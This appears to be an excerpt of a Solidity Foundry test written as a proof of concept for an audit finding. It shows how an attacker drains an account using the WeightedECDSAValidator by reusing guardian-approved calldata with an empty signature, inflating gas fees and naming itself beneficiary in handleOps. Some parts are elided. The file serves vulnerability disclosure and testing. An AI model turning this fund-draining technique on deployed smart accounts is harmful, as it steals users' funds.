...
import {TestPaymaster} from "src/mock/TestPaymaster.sol";

using ERC4337Utils for IEntryPoint;

contract DrainFundThroughWeightedECDSAValidator is KernelTestBase {
    address[] public owners;
    uint256[] public ownerKeys;
    uint24[] public weights;
    uint24 public threshold;
    uint48 public delay;
    WeightedECDSAValidator public weightedECDSAValidator;

    function setUp() public virtual {
        _initialize();
        weightedECDSAValidator =new WeightedECDSAValidator();
        defaultValidator = weightedECDSAValidator;
    ...
    function test_attack_vector() public {
        ...
        // guradian approves calldataAndNonceHash
        vm.prank(owners[0]);
        weightedECDSAValidator.approve(calldataAndNonceHash, address(kernel));
        vm.prank(owners[1]);
        weightedECDSAValidator.approve(calldataAndNonceHash, address(kernel));

        // Attacker try to drain fund from account
        address attacker = address(1);
        assertEq(attacker.balance, 0);
        op.signature = abi.encodePacked(bytes4(0x00000000));
        // 1. Attacker uses paymaster approved by account
        ...
        // 2. Attacker sets large priorityFeePerGas or preVerificationGas
        uint256 deltaPriorityFeePerGas = 1e9;
        uint256 deltaPreVerificationGas = 9e10;
        op.maxPriorityFeePerGas = op.maxPriorityFeePerGas + deltaPriorityFeePerGas;
        op.preVerificationGas = op.preVerificationGas + deltaPreVerificationGas;
        op.maxFeePerGas = op.maxFeePerGas + deltaPriorityFeePerGas;
        // 3. Attackes invoked `handleOps` of EntryPoint directly and set itself as beneficiary
        UserOperation[] memory ops = new UserOperation[](1);
        ops[0] = op;
        vm.prank(attacker);
        entryPoint.handleOps(ops, payable(attacker));
        assertGt(attacker.balance, 90 ether);
    }
